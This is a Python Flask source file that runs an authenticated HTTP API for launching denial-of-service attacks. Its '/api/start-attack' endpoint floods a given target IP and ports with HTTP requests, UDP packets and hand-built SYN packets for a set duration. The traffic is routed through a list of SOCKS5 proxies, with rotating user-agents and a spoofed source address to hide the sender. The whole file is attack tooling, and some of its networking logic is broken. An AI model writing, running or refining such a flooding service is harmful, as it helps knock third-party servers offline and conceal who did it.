from flask import Flask, request, jsonify
import socket
import random
import time
import struct
import string
import os
import socks

app = Flask(__name__)

# Environment variable for API key
API_KEY = os.getenv('API_KEY', 'default_api_key')

# List of user-agents for variety
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
]

# List of HTTP methods
http_methods = ["GET", "POST", "PUT", "HEAD"]

def get_proxies():
    with open('proxy.txt', 'r') as file:
        proxies = [line.strip() for line in file.readlines()]
    return proxies

def create_socket_with_proxy(proxy, proxy_type=socks.SOCKS5):
    proxy_ip, proxy_port = proxy.split(':')
    sock = socks.socksocket()
    sock.set_proxy(proxy_type, proxy_ip, int(proxy_port))
    return sock

def send_tcp_packet(target_ip, target_port_tcp, method):
    if target_port_tcp is None:
        return
    proxies = get_proxies()
    for proxy in proxies:
        try:
            sock_tcp = create_socket_with_proxy(proxy)
            sock_tcp.connect((target_ip, target_port_tcp))
            http_method = random.choice(http_methods)
            user_agent = random.choice(user_agents)
            if http_method in ["POST", "PUT"]:
                data_length = random.randint(1, 1024)
                data = ''.join(random.choices(string.ascii_letters + string.digits, k=data_length))
                request = f"{http_method} / HTTP/1.1\r\nUser-Agent: {user_agent}\r\nContent-Length: {data_length}\r\n\r\n{data}"
            else:
                request = f"{http_method} / HTTP/1.1\r\nUser-Agent: {user_agent}\r\n\r\n"
            if method == "flood":
                while True:
                    sock_tcp.send(request.encode())
            else:
                sock_tcp.send(request.encode())
        except Exception as e:
            pass
        finally:
            sock_tcp.close()

def send_udp_packet(target_ip, target_port_udp):
    if target_port_udp is None:
        return
    proxies = get_proxies()
    for proxy in proxies:
        try:
            sock_udp = create_socket_with_proxy(proxy, socks.SOCKS5)
            user_agent = random.choice(user_agents)
            packet_size = random.randint(1, 1024)
            packet = bytes(packet_size)
            packet_with_header = f"User-Agent: {user_agent}\r\n\r\n".encode() + packet
            sock_udp.sendto(packet_with_header, (target_ip, target_port_udp))
        except Exception as e:
            pass
        finally:
            sock_udp.close()

def send_syn_tcp_packet(target_ip, target_port_tcp):
    if target_port_tcp is None:
        return
    proxies = get_proxies()
    for proxy in proxies:
        try:
            sock_syn = create_socket_with_proxy(proxy, socks.SOCKS5)
            seq_num = random.randint(0, 2**32 - 1)
            ip_id = random.randint(0, 2**16 - 1)
            syn_packet = build_syn_packet(target_ip, target_port_tcp, seq_num, ip_id)
            sock_syn.sendto(syn_packet, (target_ip, target_port_tcp))
        except Exception as e:
            pass
        finally:
            sock_syn.close()

def build_syn_packet(target_ip, target_port_tcp, seq_num, ip_id):
    ip_version = 4
    ip_header_length = 5
    ip_total_length = 20
    ip_ttl = 64
    ip_protocol = socket.IPPROTO_TCP
    ip_src = socket.inet_aton("192.168.1.1")
    ip_dst = socket.inet_aton(target_ip)
    ip_header = struct.pack("!BBHHHBBH4s4s", 
                            (ip_version << 4) + ip_header_length, 0, ip_total_length, ip_id, 0, ip_ttl, ip_protocol, 0, ip_src, ip_dst)
    tcp_src_port = random.randint(1024, 65535)
    tcp_dst_port = target_port_tcp
    tcp_seq_num = seq_num
    tcp_ack_num = 0
    tcp_data_offset = 5
    tcp_flags = (1 << 1)
    tcp_window_size = 5840
    tcp_checksum = 0
    tcp_urgent_ptr = 0
    tcp_offset_res = (tcp_data_offset << 4) + 0
    tcp_header = struct.pack("!HHLLBBHHH", tcp_src_port, tcp_dst_port, tcp_seq_num, tcp_ack_num, tcp_offset_res, tcp_flags, tcp_window_size, tcp_checksum, tcp_urgent_ptr)
    source_address = socket.inet_aton("192.168.1.1")
    dest_address = socket.inet_aton(target_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    psh = struct.pack("!4s4sBBH", source_address, dest_address, placeholder, protocol, tcp_length) + tcp_header
    tcp_checksum = checksum(psh)
    tcp_header = struct.pack("!HHLLBBHHH", tcp_src_port, tcp_dst_port, tcp_seq_num, tcp_ack_num, tcp_offset_res, tcp_flags, tcp_window_size, tcp_checksum, tcp_urgent_ptr)
    return ip_header + tcp_header

def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i+1])
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

@app.route('/api/start-attack', methods=['POST'])
def start_attack():
    try:
        data = request.json
        key_from_query = data.get('key')
        target_ip = data.get('target_ip')
        target_port_tcp = data.get('target_port_tcp')
        target_port_udp = data.get('target_port_udp')
        duration = data.get('duration')

        if key_from_query != API_KEY:
            return jsonify({'error': 'Invalid API key'}), 401

        if not target_ip or not isinstance(duration, int):
            return jsonify({'error': 'Invalid parameters'}), 400

        timeout = time.time() + duration
        while True:
            if time.time() > timeout:
                break
            if target_port_tcp:
                send_tcp_packet(target_ip, target_port_tcp, "raw")
                send_tcp_packet(target_ip, target_port_tcp, "flood")
                send_tcp_packet(target_ip, target_port_tcp, "storm")
                send_syn_tcp_packet(target_ip, target_port_tcp)
            if target_port_udp:
                send_udp_packet(target_ip, target_port_udp)
            time.sleep(0.01)

        return jsonify({'message': 'Attack completed'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
